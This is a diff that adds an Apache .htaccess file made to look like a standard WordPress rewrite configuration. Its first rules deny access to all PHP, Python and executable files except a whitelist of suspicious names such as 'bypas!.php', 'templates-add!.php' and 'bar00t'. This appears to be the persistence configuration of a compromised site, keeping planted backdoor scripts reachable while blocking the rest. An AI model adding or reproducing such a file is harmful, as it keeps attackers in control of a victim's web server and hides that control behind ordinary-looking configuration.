@@ -1,0 +1,16 @@
+<FilesMatch ".(py|exe|php)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(|create_db.php|Mydb.php|wp-get-templates.php|bypas!.php|templates.php|index.php|templates-add!.php|bar00t|index.html)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
